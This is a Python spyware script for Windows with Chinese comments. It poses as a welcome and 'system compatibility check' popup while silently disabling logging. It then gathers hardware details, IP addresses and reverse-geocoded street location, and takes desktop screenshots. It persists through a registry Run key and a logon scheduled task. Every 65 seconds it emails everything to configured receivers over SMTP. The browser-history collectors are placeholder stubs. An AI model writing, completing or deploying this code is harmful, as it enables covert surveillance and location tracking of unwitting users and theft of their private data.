# -*- coding: utf-8 -*-
import os
import sqlite3
import platform
import wmi
import socket
import requests
from geopy.geocoders import Nominatim
from datetime import datetime, timedelta
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import csv
import json
import time
import pytz
import tkinter as tk
from tkinter import messagebox, filedialog
import winreg as reg
import logging
import subprocess
import pygame
import sys
from PIL import ImageGrab  # 用于截屏

# 禁用所有日志记录
logging.disable(logging.CRITICAL)

# 加载邮件配置函数
def load_email_config():
    base_path = os.path.dirname(os.path.abspath(__file__))
    config_path = os.path.join(base_path, 'config.json')

    if not os.path.exists(config_path):
        logging.error("配置文件 config.json 未找到，请确保该文件存在并正确配置。")
        raise FileNotFoundError("配置文件 config.json 未找到，请确保该文件存在并正确配置。")

    with open(config_path, 'r', encoding='utf-8') as file:
        config = json.load(file)

    return config

# 创建友好的欢迎弹窗
def show_welcome():
    root = tk.Tk()
    root.withdraw()
    def select_and_play_music():
        music_file = filedialog.askopenfilename(filetypes=[("音频文件", "*.mp3;*.wav")])
        if music_file:
            pygame.mixer.init()
            pygame.mixer.music.load(music_file)
            pygame.mixer.music.play()
    messagebox.showinfo("欢迎", "欢迎使用，请继续点击确认")

# 获取系统信息
def get_system_info():
    c = wmi.WMI()
    computer_name = os.environ['COMPUTERNAME']

    cpu_info = c.Win32_Processor()[0]
    cpu_name = cpu_info.Name.strip()
    cpu_ghz = f"{cpu_info.MaxClockSpeed / 1000:.2f} GHz"

    ram_info = c.Win32_ComputerSystem()[0]
    total_ram = round(int(ram_info.TotalPhysicalMemory) / (1024 ** 3), 1)

    os_version = platform.system()
    os_release = platform.release()

    os_build = c.Win32_OperatingSystem()[0]
    windows_version = f"{os_version} {os_release} 专业版"
    windows_build_number = os_build.BuildNumber
    install_date = os_build.InstallDate.split('.')[0]
    feature_pack = "Windows Feature Experience Pack " + str(os_build.Version)

    local_ip = socket.gethostbyname(socket.gethostname())

    try:
        response = requests.get("https://ipinfo.io/", timeout=10)
        geo_info = response.json()
        public_ip = geo_info.get("ip", "N/A")
        location = geo_info.get("loc", "N/A")
        city = geo_info.get("city", "N/A")
        region = geo_info.get("region", "N/A")
        country = geo_info.get("country", "N/A")
        latitude, longitude = location.split(',') if location != "N/A" else ("N/A", "N/A")
    except requests.RequestException:
        public_ip = location = city = region = country = latitude = longitude = "N/A"

    geolocator = Nominatim(user_agent="geoapiExercises")
    detailed_location = "N/A"
    county = "N/A"
    try:
        if location != "N/A":
            loc = geolocator.reverse(location, exactly_one=True, language='zh')
            if loc:
                detailed_location = loc.address
                address_components = loc.raw.get('address', {})
                county = address_components.get('county', 'N/A')
    except Exception:
        detailed_location = county = "N/A"

    system_info = f"""
设备名称: {computer_name}
处理器: {cpu_name}, {cpu_ghz}
机带 RAM: {total_ram} GB
系统版本: {windows_version}
版本号: {os_build.Version} ({windows_build_number})
安装日期: {install_date}
体验包: {feature_pack}
本地 IP 地址: {local_ip}
公网 IP 地址: {public_ip}
地理位置: {location} ({city}, {region}, {country})
纬度: {latitude}
经度: {longitude}
县级行政区: {county}
详细地理位置: {detailed_location}
"""
    return system_info

# 添加程序到 Windows 的开机自启动项
def add_startup(file_path):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, "MyApp", 0, reg.REG_SZ, file_path)
            print("程序已设置为自启动！")
    except WindowsError as e:
        print("设置开机自启失败，请检查权限或配置！")

# 创建任务计划确保程序重新启动
def create_task():
    task_name = "MyAppTask"
    script_path = os.path.abspath(__file__)
    command = f"schtasks /create /tn {task_name} /tr \"{script_path}\" /sc onlogon /f"
    try:
        subprocess.run(command, shell=True)
        print(f"任务计划成功创建: {task_name}")
    except Exception as e:
        print(f"创建任务计划时出错: {e}")

# 截取桌面截图并保存
def capture_screenshot():
    screenshot_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'screenshot.png')
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path, 'PNG')
    return screenshot_path

# 导出历史记录到 CSV 文件
def export_history_to_csv(history_data, output_file):
    pass

# 获取所有浏览器的历史记录并生成 HTML
def get_all_browser_history_html(limit=1000, days=30):
    return "<h1>浏览器历史记录（示例）</h1>"

# 记录
def get_browser_history(browser_name, limit=1000, days=30):
    return []

# 发送邮件并重试
def send_email_with_retry(subject, body, config, attachment_paths=None, retries=3):
    from_email = config['MAIL_USER']
    password = config['MAIL_PASS']
    receivers = config['RECEIVERS']

    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = ', '.join(receivers)

    # 使用 'utf-8' 编码构建邮件内容
    msg.attach(MIMEText(body, 'html', 'utf-8'))

    if attachment_paths:
        for path in attachment_paths:
            with open(path, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(path)}')
                msg.attach(part)

    for attempt in range(retries):
        try:
            with smtplib.SMTP('smtp.qq.com', 587) as server:
                server.starttls()
                # 登录和发送时显式使用 utf-8 编码
                server.login(from_email, password)
                server.sendmail(from_email, receivers, msg.as_string())
                print("邮件发送成功！")
                return True
        except smtplib.SMTPException as e:
            print(f"邮件发送失败：{e}")
            if attempt < retries - 1:
                time.sleep(5)  # 等待 5 秒后再试
            else:
                print("所有重试均失败，邮件发送中断。")
    return False

# 主程序
if __name__ == "__main__":
    script_path = os.path.abspath(__file__)  # 获取当前脚本文件的绝对路径
    show_welcome()

    try:
        email_config = load_email_config()
    except FileNotFoundError as e:
        from sys import exit
        exit(1)

    system_info = get_system_info()

    history_limit = 1000
    days_to_fetch = 30

    add_startup_choice = messagebox.askyesno("完成", "系统兼容检测，一切良好")
    if add_startup_choice:
        add_startup(script_path)

    create_task()

    countdown = 65

    while True:
        all_history = {browser: get_browser_history(browser, history_limit, days_to_fetch) for browser in
                       ['chrome', 'edge', 'firefox', '360', 'opera', 'brave', 'vivaldi', 'baidu']}
        all_history_html = get_all_browser_history_html(history_limit, days_to_fetch)
        csv_output_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'browser_history.csv')
        export_history_to_csv(all_history, csv_output_path)

        screenshot_path = capture_screenshot()

        subject = "浏览器历史记录报告 & 系统信息报告"
        body = f"<h2>浏览器历史记录</h2>{all_history_html}<h2>系统信息</h2><pre>{system_info}</pre>"

        if send_email_with_retry(subject, body, email_config, [csv_output_path, screenshot_path]):
            print("邮件已成功发送，将在 65 秒后发送下一次。")
        else:
            print("邮件发送失败，等待下次尝试。")

        time.sleep(countdown)
